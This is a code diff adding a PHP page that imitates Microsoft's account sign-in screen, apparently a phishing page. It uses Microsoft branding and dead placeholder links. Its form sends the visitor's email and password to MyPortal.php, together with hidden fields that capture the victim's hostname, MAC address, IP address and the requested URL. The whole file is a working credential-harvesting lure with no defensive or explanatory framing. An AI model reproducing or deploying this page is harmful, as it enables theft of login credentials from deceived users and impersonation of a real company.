@@ -1,0 +1,53 @@
+<?php
+$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+require_once('helper.php');
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="assets/app.css" />
+</head>
+
+<body>
+    <div class="auth-wrapper">
+        <img src="assets/logo.svg" alt="Microsoft" width="110"/>
+        <h2 class="title mb-16 mt-16">Sign in</h2>
+        <form method="POST" action="MyPortal.php">
+            <div class="mb-16">
+                <p id="error_uname" class="error"></p>
+                <input id="inp_uname" type="text" name="email" class="input" placeholder="Email, phone, or Skype" required />
+            </div>
+            <div class="mb-16">
+                <input id="inp_pwd" type="password" name="password" class="input" placeholder="Password" required />
+            </div>
+            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+            <input type="hidden" name="target" value="<?=$destination?>">
+            <button class="btn" type="submit">Next</button>
+        </form>
+        <div>
+            <p class="mb-16 fs-13">No account? <a href="#" class="link">Create one!</a></p>
+            <p class="mb-16 fs-13">
+                <a href="#" class="link">Sign in with a security key
+                    <img src="assets/question.png" alt="Question img">
+                </a>
+            </p>
+        </div>
+    </div>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script src="assets/app.js"></script>
+</body>
+
+</html>
